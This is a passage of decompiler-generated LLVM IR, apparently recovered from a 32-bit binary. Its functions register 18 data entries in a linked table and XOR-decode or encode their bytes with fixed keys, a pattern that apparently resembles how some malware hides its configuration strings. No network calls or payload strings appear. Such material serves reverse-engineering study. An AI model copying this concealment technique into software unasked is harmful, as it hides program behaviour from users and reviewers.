  %v0_400d5c = phi i32 [ %v0_400d88, %dec_label_pc_400d5c ], [ %v0_400d40, %dec_label_pc_400d50 ]
  %v1_400d5c = add i32 %v0_400d5c, 4
  %v2_400d5c = inttoptr i32 %v1_400d5c to i32*
  %v3_400d5c = load i32, i32* %v2_400d5c, align 4
  %v2_400d64 = add i32 %v3_400d5c, %v0_400d64
  store i32 %v2_400d64, i32* %v0.global-to-local, align 4
  %v1_400d68 = add i32 %v2_400d64, 1
  %v2_400d68 = inttoptr i32 %v1_400d68 to i8*
  %v3_400d68 = load i8, i8* %v2_400d68, align 1
  %v1_400d6c = inttoptr i32 %v2_400d64 to i8*
  %v2_400d6c = load i8, i8* %v1_400d6c, align 1
  %v3_400d6c = sext i8 %v2_400d6c to i32
  store i32 %v3_400d6c, i32* %a0.global-to-local, align 4
  store i8 %v3_400d68, i8* %v1_400d6c, align 1
  %v0_400d74 = load i32, i32* %a1.global-to-local, align 4
  %v1_400d74 = add i32 %v0_400d74, 4
  %v2_400d74 = inttoptr i32 %v1_400d74 to i32*
  %v3_400d74 = load i32, i32* %v2_400d74, align 4
  %v1_400d7c = load i32, i32* %a2.global-to-local, align 4
  %v2_400d7c = add i32 %v1_400d7c, %v3_400d74
  store i32 %v2_400d7c, i32* %v0.global-to-local, align 4
  %v0_400d80 = load i32, i32* %a0.global-to-local, align 4
  %v1_400d80 = trunc i32 %v0_400d80 to i8
  %v3_400d80 = add i32 %v2_400d7c, 1
  %v4_400d80 = inttoptr i32 %v3_400d80 to i8*
  store i8 %v1_400d80, i8* %v4_400d80, align 1
  %v0_400d84 = load i32, i32* %a2.global-to-local, align 4
  %v1_400d84 = add i32 %v0_400d84, 2
  store i32 %v1_400d84, i32* %a2.global-to-local, align 4
  %v0_400d88 = load i32, i32* %a1.global-to-local, align 4
  %v1_400d88 = add i32 %v0_400d88, 8
  %v2_400d88 = inttoptr i32 %v1_400d88 to i16*
  %v3_400d88 = load i16, i16* %v2_400d88, align 2
  %v4_400d88 = zext i16 %v3_400d88 to i32
  %v2_400d90 = icmp slt i32 %v1_400d84, %v4_400d88
  %v3_400d90 = zext i1 %v2_400d90 to i32
  store i32 %v3_400d90, i32* %v0.global-to-local, align 4
  br i1 %v2_400d90, label %dec_label_pc_400d5c, label %dec_label_pc_400d98

dec_label_pc_400d98:                              ; preds = %dec_label_pc_400d5c
  %v2_400d9c = add i32 %v0_400d88, 10
  %v3_400d9c = inttoptr i32 %v2_400d9c to i8*
  store i8 0, i8* %v3_400d9c, align 1
  ret i32 %v3_400d90

dec_label_pc_400da4:                              ; preds = %dec_label_pc_400c98
  %v1_400da4 = add i32 %v0_400cb0, 12
  %v2_400da4 = inttoptr i32 %v1_400da4 to i32*
  %v3_400da4 = load i32, i32* %v2_400da4, align 4
  store i32 %v3_400da4, i32* %a1.global-to-local, align 4
  %v1_400dac = icmp eq i32 %v3_400da4, 0
  br i1 %v1_400dac, label %dec_label_pc_400db0, label %dec_label_pc_400c98

dec_label_pc_400db0:                              ; preds = %dec_label_pc_400da4
  store i8 0, i8* inttoptr (i32 10 to i8*), align 2
  %v1_400db8.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_400db8

dec_label_pc_400db8:                              ; preds = %dec_label_pc_400cac, %dec_label_pc_400db0
  %v1_400db8 = phi i32 [ %v4_400cb0, %dec_label_pc_400cac ], [ %v1_400db8.pre, %dec_label_pc_400db0 ]
  ret i32 %v1_400db8

; uselistorder directives
  uselistorder i32 %v3_400da4, { 1, 2, 0 }
  uselistorder i32 %v0_400d88, { 0, 2, 1 }
  uselistorder i32 %v1_400d84, { 0, 2, 1 }
  uselistorder i32 %v0_400d48, { 1, 0 }
  uselistorder i32 %v0_400d40, { 0, 2, 1 }
  uselistorder i32 %v0_400d2c, { 1, 0 }
  uselistorder i32 %v2_400c98, { 1, 0, 2 }
  uselistorder i32 %v0_400cb0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_400c94, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder label %dec_label_pc_400db8, { 1, 0 }
}

define i32 @function_400dc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_400dc0:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v3_400dcc = load i32, i32* bitcast (i32** @global_var_4492cc.54 to i32*), align 4
  store i32 %v3_400dcc, i32* %v0.global-to-local, align 4
  store i32 %v3_400dcc, i32* %a1.global-to-local, align 4
  %v1_400ddc = urem i32 %arg1, 256
  store i32 %v1_400ddc, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_400de0

dec_label_pc_400de0:                              ; preds = %dec_label_pc_400ef0, %dec_label_pc_400dc0
  %v0_400df8 = phi i32 [ %v3_400ef0, %dec_label_pc_400ef0 ], [ %v3_400dcc, %dec_label_pc_400dc0 ]
  %v1_400de0 = inttoptr i32 %v0_400df8 to i32*
  %v2_400de0 = load i32, i32* %v1_400de0, align 4
  store i32 %v2_400de0, i32* %v0.global-to-local, align 4
  %v1_400de8 = icmp sgt i32 %v2_400de0, 0
  %v2_400df0 = icmp eq i32 %v1_400ddc, %v2_400de0
  %or.cond = and i1 %v1_400de8, %v2_400df0
  br i1 %or.cond, label %dec_label_pc_400df4, label %dec_label_pc_400ef0

dec_label_pc_400df4:                              ; preds = %dec_label_pc_400de0
  %v1_400df8 = add i32 %v0_400df8, 10
  %v2_400df8 = inttoptr i32 %v1_400df8 to i8*
  %v3_400df8 = load i8, i8* %v2_400df8, align 1
  %v4_400df8 = sext i8 %v3_400df8 to i32
  store i32 %v4_400df8, i32* %v0.global-to-local, align 4
  %v1_400e00 = icmp eq i8 %v3_400df8, 0
  store i32 0, i32* %a0.global-to-local, align 4
  br i1 %v1_400e00, label %dec_label_pc_400e04, label %dec_label_pc_400f04

dec_label_pc_400e04:                              ; preds = %dec_label_pc_400df4
  store i32 -19, i32* %t0.global-to-local, align 4
  store i32 -22, i32* @a3, align 4
  store i32 -34, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400e18

dec_label_pc_400e18:                              ; preds = %dec_label_pc_400e18.dec_label_pc_400e18_crit_edge, %dec_label_pc_400e04
  %v1_400e2c = phi i32 [ %v1_400e2c.pre, %dec_label_pc_400e18.dec_label_pc_400e18_crit_edge ], [ -19, %dec_label_pc_400e04 ]
  %v0_400e20 = phi i32 [ %v0_400e90, %dec_label_pc_400e18.dec_label_pc_400e18_crit_edge ], [ 0, %dec_label_pc_400e04 ]
  %v0_400e18 = phi i32 [ %v0_400e88, %dec_label_pc_400e18.dec_label_pc_400e18_crit_edge ], [ %v0_400df8, %dec_label_pc_400e04 ]
  %v1_400e18 = add i32 %v0_400e18, 4
  %v2_400e18 = inttoptr i32 %v1_400e18 to i32*
  %v3_400e18 = load i32, i32* %v2_400e18, align 4
  %v2_400e20 = add i32 %v3_400e18, %v0_400e20
  %v1_400e24 = inttoptr i32 %v2_400e20 to i8*
  %v2_400e24 = load i8, i8* %v1_400e24, align 1
  %v3_400e24 = zext i8 %v2_400e24 to i32
  %v2_400e2c = xor i32 %v3_400e24, %v1_400e2c
  store i32 %v2_400e2c, i32* %v0.global-to-local, align 4
  %v1_400e30 = trunc i32 %v2_400e2c to i8
  store i8 %v1_400e30, i8* %v1_400e24, align 1
  %v0_400e34 = load i32, i32* %a1.global-to-local, align 4
  %v1_400e34 = add i32 %v0_400e34, 4
  %v2_400e34 = inttoptr i32 %v1_400e34 to i32*
  %v3_400e34 = load i32, i32* %v2_400e34, align 4
  %v0_400e3c = load i32, i32* %a0.global-to-local, align 4
  %v2_400e3c = add i32 %v0_400e3c, %v3_400e34
  %v1_400e40 = inttoptr i32 %v2_400e3c to i8*
  %v2_400e40 = load i8, i8* %v1_400e40, align 1
  %v3_400e40 = zext i8 %v2_400e40 to i32
  %v1_400e48 = load i32, i32* @a3, align 4
  %v2_400e48 = xor i32 %v1_400e48, %v3_400e40
  store i32 %v2_400e48, i32* %v0.global-to-local, align 4
  %v1_400e4c = trunc i32 %v2_400e48 to i8
  store i8 %v1_400e4c, i8* %v1_400e40, align 1
  %v0_400e50 = load i32, i32* %a1.global-to-local, align 4
  %v1_400e50 = add i32 %v0_400e50, 4
  %v2_400e50 = inttoptr i32 %v1_400e50 to i32*
  %v3_400e50 = load i32, i32* %v2_400e50, align 4
  %v0_400e58 = load i32, i32* %a0.global-to-local, align 4
  %v2_400e58 = add i32 %v0_400e58, %v3_400e50
  %v1_400e5c = inttoptr i32 %v2_400e58 to i8*
  %v2_400e5c = load i8, i8* %v1_400e5c, align 1
  %v3_400e5c = zext i8 %v2_400e5c to i32
  %v1_400e64 = load i32, i32* %a2.global-to-local, align 4
  %v2_400e64 = xor i32 %v1_400e64, %v3_400e5c
  store i32 %v2_400e64, i32* %v0.global-to-local, align 4
  %v1_400e68 = trunc i32 %v2_400e64 to i8
  store i8 %v1_400e68, i8* %v1_400e5c, align 1
  %v0_400e6c = load i32, i32* %a1.global-to-local, align 4
  %v1_400e6c = add i32 %v0_400e6c, 4
  %v2_400e6c = inttoptr i32 %v1_400e6c to i32*
  %v3_400e6c = load i32, i32* %v2_400e6c, align 4
  %v0_400e74 = load i32, i32* %a0.global-to-local, align 4
  %v2_400e74 = add i32 %v0_400e74, %v3_400e6c
  %v1_400e78 = inttoptr i32 %v2_400e74 to i8*
  %v2_400e78 = load i8, i8* %v1_400e78, align 1
  %v3_400e78 = zext i8 %v2_400e78 to i32
  %v1_400e7c = add i32 %v0_400e74, 1
  store i32 %v1_400e7c, i32* %a0.global-to-local, align 4
  %v1_400e80 = load i32, i32* %a2.global-to-local, align 4
  %v2_400e80 = xor i32 %v1_400e80, %v3_400e78
  store i32 %v2_400e80, i32* %v0.global-to-local, align 4
  %v1_400e84 = trunc i32 %v2_400e80 to i8
  store i8 %v1_400e84, i8* %v1_400e78, align 1
  %v0_400e88 = load i32, i32* %a1.global-to-local, align 4
  %v1_400e88 = add i32 %v0_400e88, 8
  %v2_400e88 = inttoptr i32 %v1_400e88 to i16*
  %v3_400e88 = load i16, i16* %v2_400e88, align 2
  %v4_400e88 = zext i16 %v3_400e88 to i32
  %v0_400e90 = load i32, i32* %a0.global-to-local, align 4
  %v2_400e90 = icmp slt i32 %v0_400e90, %v4_400e88
  %v3_400e90 = zext i1 %v2_400e90 to i32
  store i32 %v3_400e90, i32* %v0.global-to-local, align 4
  br i1 %v2_400e90, label %dec_label_pc_400e18.dec_label_pc_400e18_crit_edge, label %dec_label_pc_400e98

dec_label_pc_400e18.dec_label_pc_400e18_crit_edge: ; preds = %dec_label_pc_400e18
  %v1_400e2c.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_400e18

dec_label_pc_400e98:                              ; preds = %dec_label_pc_400e18
  store i32 0, i32* @a2, align 4
  br label %dec_label_pc_400ea4

dec_label_pc_400ea4:                              ; preds = %dec_label_pc_400ea4, %dec_label_pc_400e98
  %v0_400eac = phi i32 [ %v1_400ecc, %dec_label_pc_400ea4 ], [ 0, %dec_label_pc_400e98 ]
  %v0_400ea4 = phi i32 [ %v0_400ed0, %dec_label_pc_400ea4 ], [ %v0_400e88, %dec_label_pc_400e98 ]
  %v1_400ea4 = add i32 %v0_400ea4, 4
  %v2_400ea4 = inttoptr i32 %v1_400ea4 to i32*
  %v3_400ea4 = load i32, i32* %v2_400ea4, align 4
  %v2_400eac = add i32 %v3_400ea4, %v0_400eac
  store i32 %v2_400eac, i32* %v0.global-to-local, align 4
  %v1_400eb0 = add i32 %v2_400eac, 1
  %v2_400eb0 = inttoptr i32 %v1_400eb0 to i8*
  %v3_400eb0 = load i8, i8* %v2_400eb0, align 1
  %v4_400eb0 = zext i8 %v3_400eb0 to i32
  store i32 %v4_400eb0, i32* @v1, align 4
  %v1_400eb4 = inttoptr i32 %v2_400eac to i8*
  %v2_400eb4 = load i8, i8* %v1_400eb4, align 1
  %v3_400eb4 = sext i8 %v2_400eb4 to i32
  store i32 %v3_400eb4, i32* %a0.global-to-local, align 4
  store i8 %v3_400eb0, i8* %v1_400eb4, align 1
  %v0_400ebc = load i32, i32* %a1.global-to-local, align 4
  %v1_400ebc = add i32 %v0_400ebc, 4
  %v2_400ebc = inttoptr i32 %v1_400ebc to i32*
  %v3_400ebc = load i32, i32* %v2_400ebc, align 4
  %v1_400ec4 = load i32, i32* @a2, align 4
  %v2_400ec4 = add i32 %v1_400ec4, %v3_400ebc
  store i32 %v2_400ec4, i32* %v0.global-to-local, align 4
  %v0_400ec8 = load i32, i32* %a0.global-to-local, align 4
  %v1_400ec8 = trunc i32 %v0_400ec8 to i8
  %v3_400ec8 = add i32 %v2_400ec4, 1
  %v4_400ec8 = inttoptr i32 %v3_400ec8 to i8*
  store i8 %v1_400ec8, i8* %v4_400ec8, align 1
  %v0_400ecc = load i32, i32* @a2, align 4
  %v1_400ecc = add i32 %v0_400ecc, 2
  store i32 %v1_400ecc, i32* @a2, align 4
  %v0_400ed0 = load i32, i32* %a1.global-to-local, align 4
  %v1_400ed0 = add i32 %v0_400ed0, 8
  %v2_400ed0 = inttoptr i32 %v1_400ed0 to i16*
  %v3_400ed0 = load i16, i16* %v2_400ed0, align 2
  %v4_400ed0 = zext i16 %v3_400ed0 to i32
  %v1_400ed8 = add nsw i32 %v4_400ed0, -1
  %v2_400edc = icmp slt i32 %v1_400ecc, %v1_400ed8
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v2_400edc, label %dec_label_pc_400ea4, label %dec_label_pc_400ee4

dec_label_pc_400ee4:                              ; preds = %dec_label_pc_400ea4
  %v5_400ee8 = add i32 %v0_400ed0, 10
  %v6_400ee8 = inttoptr i32 %v5_400ee8 to i8*
  store i8 1, i8* %v6_400ee8, align 1
  ret i32 1

dec_label_pc_400ef0:                              ; preds = %dec_label_pc_400de0
  %v1_400ef0 = add i32 %v0_400df8, 12
  %v2_400ef0 = inttoptr i32 %v1_400ef0 to i32*
  %v3_400ef0 = load i32, i32* %v2_400ef0, align 4
  store i32 %v3_400ef0, i32* %a1.global-to-local, align 4
  %v1_400ef8 = icmp eq i32 %v3_400ef0, 0
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v1_400ef8, label %dec_label_pc_400efc, label %dec_label_pc_400de0

dec_label_pc_400efc:                              ; preds = %dec_label_pc_400ef0
  store i8 1, i8* inttoptr (i32 10 to i8*), align 2
  %v1_400f04.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_400f04

dec_label_pc_400f04:                              ; preds = %dec_label_pc_400df4, %dec_label_pc_400efc
  %v1_400f04 = phi i32 [ %v4_400df8, %dec_label_pc_400df4 ], [ %v1_400f04.pre, %dec_label_pc_400efc ]
  ret i32 %v1_400f04

; uselistorder directives
  uselistorder i32 %v3_400ef0, { 1, 2, 0 }
  uselistorder i32 %v0_400ed0, { 0, 2, 1 }
  uselistorder i32 %v1_400ecc, { 0, 2, 1 }
  uselistorder i32 %v0_400e90, { 1, 0 }
  uselistorder i32 %v0_400e88, { 0, 2, 1 }
  uselistorder i32 %v0_400e74, { 1, 0 }
  uselistorder i32 %v2_400de0, { 1, 0, 2 }
  uselistorder i32 %v0_400df8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_400ddc, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 9, 7, 8, 10, 11, 12, 2, 3, 4, 5, 6 }
  uselistorder i32* %a1.global-to-local, { 0, 3, 4, 5, 6, 1, 2, 7 }
  uselistorder i32* %a0.global-to-local, { 2, 3, 5, 8, 6, 7, 4, 0, 1 }
  uselistorder label %dec_label_pc_400f04, { 1, 0 }
}

define i32 @function_400f0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_400f0c:
  %v3_400f18 = load i32, i32* bitcast (i32** @global_var_4492cc.54 to i32*), align 4
  %v1_400f28 = urem i32 %arg1, 256
  br label %dec_label_pc_400f2c

dec_label_pc_400f2c:                              ; preds = %dec_label_pc_400f50, %dec_label_pc_400f0c
  %v0_400f44 = phi i32 [ %v3_400f50, %dec_label_pc_400f50 ], [ %v3_400f18, %dec_label_pc_400f0c ]
  %v1_400f2c = inttoptr i32 %v0_400f44 to i32*
  %v2_400f2c = load i32, i32* %v1_400f2c, align 4
  %v1_400f34 = icmp sgt i32 %v2_400f2c, 0
  %v2_400f3c = icmp eq i32 %v1_400f28, %v2_400f2c
  %or.cond = and i1 %v1_400f34, %v2_400f3c
  br i1 %or.cond, label %dec_label_pc_400f40, label %dec_label_pc_400f50

dec_label_pc_400f40:                              ; preds = %dec_label_pc_400f2c
  %v1_400f44 = add i32 %v0_400f44, 4
  %v2_400f44 = inttoptr i32 %v1_400f44 to i32*
  %v3_400f44 = load i32, i32* %v2_400f44, align 4
  ret i32 %v3_400f44

dec_label_pc_400f50:                              ; preds = %dec_label_pc_400f2c
  %v1_400f50 = add i32 %v0_400f44, 12
  %v2_400f50 = inttoptr i32 %v1_400f50 to i32*
  %v3_400f50 = load i32, i32* %v2_400f50, align 4
  %v1_400f58 = icmp eq i32 %v3_400f50, 0
  br i1 %v1_400f58, label %dec_label_pc_400f5c, label %dec_label_pc_400f2c

dec_label_pc_400f5c:                              ; preds = %dec_label_pc_400f50
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_400f50, { 1, 0 }
  uselistorder i32 %v2_400f2c, { 1, 0 }
  uselistorder i32 %v0_400f44, { 1, 0, 2 }
}

define i32 @function_400f68() local_unnamed_addr {
dec_label_pc_400f68:
  %v3_400f80 = load i32, i32* @global_var_449458.24, align 4
  store i32 %v3_400f80, i32* @t9, align 4
  %v2_400f88 = call i32 @function_405c90(i32 16)
  %v1_400f94 = inttoptr i32 %v2_400f88 to i32*
  store i32 0, i32* %v1_400f94, align 4
  %v3_400f98 = load i32, i32* bitcast (i32** @global_var_449394.56 to i32*), align 4
  %v2_400fa0 = inttoptr i32 %v3_400f98 to i32*
  store i32 %v2_400f88, i32* %v2_400fa0, align 4
  %v3_400fa4 = load i32, i32* bitcast (i32** @global_var_4492cc.54 to i32*), align 4
  %v2_400fac = inttoptr i32 %v3_400fa4 to i32*
  store i32 %v2_400f88, i32* %v2_400fac, align 4
  %v1_400fb0 = add i32 %v2_400f88, 12
  %v2_400fb0 = inttoptr i32 %v1_400fb0 to i32*
  store i32 0, i32* %v2_400fb0, align 4
  ret i32 %v2_400f88

; uselistorder directives
  uselistorder i32 %v2_400f88, { 0, 2, 1, 3, 4 }
}

define i32 @function_400fc4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_400fc4:
  %v1.global-to-local = alloca i32, align 4
  %v0_400fdc = load i32, i32* @s2, align 4
  %v0_400fe0 = load i32, i32* @s1, align 4
  %v0_400fe4 = load i32, i32* @s0, align 4
  %v3_400fec = load i32, i32* @global_var_449458.24, align 4
  store i32 %v3_400fec, i32* @t9, align 4
  store i32 %arg1, i32* @s2, align 4
  %v1_400ff8 = urem i32 %arg2, 65536
  store i32 %v1_400ff8, i32* @s1, align 4
  %v3_400ffc = call i32 @function_405c90(i32 16)
  %v0_401008 = load i32, i32* @s1, align 4
  %v3_40100c = load i32, i32* @global_var_449458.24, align 4
  store i32 %v3_40100c, i32* @t9, align 4
  %v0_401010 = load i32, i32* @s2, align 4
  %v2_401010 = inttoptr i32 %v3_400ffc to i32*
  store i32 %v0_401010, i32* %v2_401010, align 4
  store i32 %v3_400ffc, i32* @s0, align 4
  %v3_401014 = call i32 @function_405c90(i32 %v0_401008)
  store i32 %v3_401014, i32* @v0, align 4
  %v1_401020 = load i32, i32* @s0, align 4
  %v2_401020 = add i32 %v1_401020, 4
  %v3_401020 = inttoptr i32 %v2_401020 to i32*
  store i32 %v3_401014, i32* %v3_401020, align 4
  %v3_401024 = load i32, i32* @global_var_44936c.20, align 4
  store i32 %v3_401024, i32* @t9, align 4
  %v2_401030 = call i32 @function_404258()
  %v3_401040 = load i32, i32* bitcast (i32** @global_var_449394.56 to i32*), align 4
  store i32 %v3_401040, i32* %v1.global-to-local, align 4
  %v0_401044 = load i32, i32* @s1, align 4
  %v1_401044 = trunc i32 %v0_401044 to i16
  %v2_401044 = load i32, i32* @s0, align 4
  %v3_401044 = add i32 %v2_401044, 8
  %v4_401044 = inttoptr i32 %v3_401044 to i16*
  store i16 %v1_401044, i16* %v4_401044, align 2
  %v3_40104c = load i32, i32* @s0, align 4
  %v4_40104c = add i32 %v3_40104c, 10
  %v5_40104c = inttoptr i32 %v4_40104c to i8*
  store i8 -1, i8* %v5_40104c, align 1
  %v0_401050 = load i32, i32* @s0, align 4
  %v1_401050 = add i32 %v0_401050, 12
  %v2_401050 = inttoptr i32 %v1_401050 to i32*
  store i32 0, i32* %v2_401050, align 4
  %v0_401054 = load i32, i32* @s0, align 4
  store i32 %v0_401054, i32* @global_var_4493a0.57, align 4
  %v1_401058 = load i32, i32* %v1.global-to-local, align 4
  %v2_401058 = inttoptr i32 %v1_401058 to i32*
  store i32 %v0_401054, i32* %v2_401058, align 4
  store i32 %v0_400fdc, i32* @s2, align 4
  store i32 %v0_400fe0, i32* @s1, align 4
  store i32 %v0_400fe4, i32* @s0, align 4
  ret i32 -1
}

define i32 @function_401078() local_unnamed_addr {
dec_label_pc_401078:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %fp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %t9.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp39 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-8768 = alloca i8, align 1
  %stack_var_-8784 = alloca i32, align 4
  %stack_var_-8752 = alloca i32, align 4
  %stack_var_-4143 = alloca i32, align 4
  %stack_var_-8239 = alloca i32, align 4
  %v0_401088 = load i32, i32* @ra, align 4
  %v3_401090 = load i32, i32* @global_var_4493a4.58, align 4
  store i32 %v3_401090, i32* @t9, align 4
  %v1_401098 = call i32 @function_400f68()
  store i32 %v1_401098, i32* %v0.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  %v3_4010a8 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v3_4010ac = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_4010ac, i32* @t9, align 4
  %v1_4010b0 = add i32 %v3_4010a8, 32736
  store i32 7, i32* %a1.global-to-local, align 4
  %v4_4010b4 = call i32 @function_400fc4(i32 1, i32 7, i32 %v1_4010b0)
  store i32 %v4_4010b4, i32* %v0.global-to-local, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  %v3_4010c4 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v3_4010c8 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_4010c8, i32* @t9, align 4
  %v1_4010cc = add i32 %v3_4010c4, 32744
  store i32 6, i32* %a1.global-to-local, align 4
  %v4_4010d0 = call i32 @function_400fc4(i32 2, i32 6, i32 %v1_4010cc)
  store i32 %v4_4010d0, i32* %v0.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  %v3_4010e0 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v3_4010e4 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_4010e4, i32* @t9, align 4
  %v1_4010e8 = add i32 %v3_4010e0, 32752
  store i32 5, i32* %a1.global-to-local, align 4
  %v4_4010ec = call i32 @function_400fc4(i32 3, i32 5, i32 %v1_4010e8)
  store i32 %v4_4010ec, i32* %v0.global-to-local, align 4
  store i32 4, i32* %a0.global-to-local, align 4
  %v3_4010fc = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v3_401100 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_401100, i32* @t9, align 4
  %v1_401104 = add i32 %v3_4010fc, 32760
  store i32 14, i32* %a1.global-to-local, align 4
  %v4_401108 = call i32 @function_400fc4(i32 4, i32 14, i32 %v1_401104)
  store i32 %v4_401108, i32* %v0.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  %v3_40111c = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_40111c, i32* @t9, align 4
  store i32 4, i32* %a1.global-to-local, align 4
  %v4_401124 = call i32 @function_400fc4(i32 5, i32 4, i32 ptrtoint (i32* @global_var_408008.61 to i32))
  store i32 %v4_401124, i32* %v0.global-to-local, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  %v3_401138 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_401138, i32* @t9, align 4
  store i32 17, i32* %a1.global-to-local, align 4
  %v4_401140 = call i32 @function_400fc4(i32 6, i32 17, i32 ptrtoint (i32* @global_var_408010.62 to i32))
  store i32 %v4_401140, i32* %v0.global-to-local, align 4
  store i32 7, i32* %a0.global-to-local, align 4
  %v3_401154 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_401154, i32* @t9, align 4
  store i32 10, i32* %a1.global-to-local, align 4
  %v4_40115c = call i32 @function_400fc4(i32 7, i32 10, i32 ptrtoint (i32* @global_var_408024.63 to i32))
  store i32 %v4_40115c, i32* %v0.global-to-local, align 4
  store i32 8, i32* %a0.global-to-local, align 4
  %v3_401170 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_401170, i32* @t9, align 4
  store i32 8, i32* %a1.global-to-local, align 4
  %v4_401178 = call i32 @function_400fc4(i32 8, i32 8, i32 ptrtoint (i32* @global_var_408030.64 to i32))
  store i32 %v4_401178, i32* %v0.global-to-local, align 4
  store i32 9, i32* %a0.global-to-local, align 4
  %v3_40118c = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_40118c, i32* @t9, align 4
  store i32 13, i32* %a1.global-to-local, align 4
  %v4_401194 = call i32 @function_400fc4(i32 9, i32 13, i32 ptrtoint (i32* @global_var_40803c.65 to i32))
  store i32 %v4_401194, i32* %v0.global-to-local, align 4
  store i32 10, i32* %a0.global-to-local, align 4
  %v3_4011a8 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_4011a8, i32* @t9, align 4
  store i32 11, i32* %a1.global-to-local, align 4
  %v4_4011b0 = call i32 @function_400fc4(i32 10, i32 11, i32 ptrtoint (i32* @global_var_40804c.66 to i32))
  store i32 %v4_4011b0, i32* %v0.global-to-local, align 4
  store i32 11, i32* %a0.global-to-local, align 4
  %v3_4011c4 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_4011c4, i32* @t9, align 4
  store i32 15, i32* %a1.global-to-local, align 4
  %v4_4011cc = call i32 @function_400fc4(i32 11, i32 15, i32 ptrtoint (i32* @global_var_408058.67 to i32))
  store i32 %v4_4011cc, i32* %v0.global-to-local, align 4
  store i32 12, i32* %a0.global-to-local, align 4
  %v3_4011e0 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_4011e0, i32* @t9, align 4
  store i32 10, i32* %a1.global-to-local, align 4
  %v4_4011e8 = call i32 @function_400fc4(i32 12, i32 10, i32 ptrtoint (i32* @global_var_408068.68 to i32))
  store i32 %v4_4011e8, i32* %v0.global-to-local, align 4
  store i32 13, i32* %a0.global-to-local, align 4
  %v3_4011fc = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_4011fc, i32* @t9, align 4
  store i32 10, i32* %a1.global-to-local, align 4
  %v4_401204 = call i32 @function_400fc4(i32 13, i32 10, i32 ptrtoint (i32* @global_var_408074.69 to i32))
  store i32 %v4_401204, i32* %v0.global-to-local, align 4
  store i32 14, i32* %a0.global-to-local, align 4
  %v3_401218 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_401218, i32* @t9, align 4
  store i32 23, i32* %a1.global-to-local, align 4
  %v4_401220 = call i32 @function_400fc4(i32 14, i32 23, i32 ptrtoint (i32* @global_var_408080.70 to i32))
  store i32 %v4_401220, i32* %v0.global-to-local, align 4
  store i32 15, i32* %a0.global-to-local, align 4
  %v3_401234 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_401234, i32* @t9, align 4
  store i32 33, i32* %a1.global-to-local, align 4
  %v4_40123c = call i32 @function_400fc4(i32 15, i32 33, i32 ptrtoint (i32* @global_var_408098.71 to i32))
  store i32 %v4_40123c, i32* %v0.global-to-local, align 4
  store i32 16, i32* %a0.global-to-local, align 4
  %v3_401250 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_401250, i32* @t9, align 4
  store i32 23, i32* %a1.global-to-local, align 4
  %v4_401258 = call i32 @function_400fc4(i32 16, i32 23, i32 ptrtoint (i32* @global_var_4080bc.72 to i32))
  store i32 %v4_401258, i32* %v0.global-to-local, align 4
  store i32 17, i32* %a0.global-to-local, align 4
  %v3_40126c = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_40126c, i32* @t9, align 4
  store i32 8, i32* %a1.global-to-local, align 4
  %v4_401274 = call i32 @function_400fc4(i32 17, i32 8, i32 ptrtoint (i32* @global_var_4080d4.73 to i32))
  store i32 %v4_401274, i32* %v0.global-to-local, align 4
  store i32 18, i32* %a0.global-to-local, align 4
  %v3_401288 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_401288, i32* @t9, align 4
  store i32 8, i32* %a1.global-to-local, align 4
  %v4_401290 = call i32 @function_400fc4(i32 18, i32 8, i32 ptrtoint (i32* @global_var_4080e0.74 to i32))
  store i32 %v4_401290, i32* %v0.global-to-local, align 4
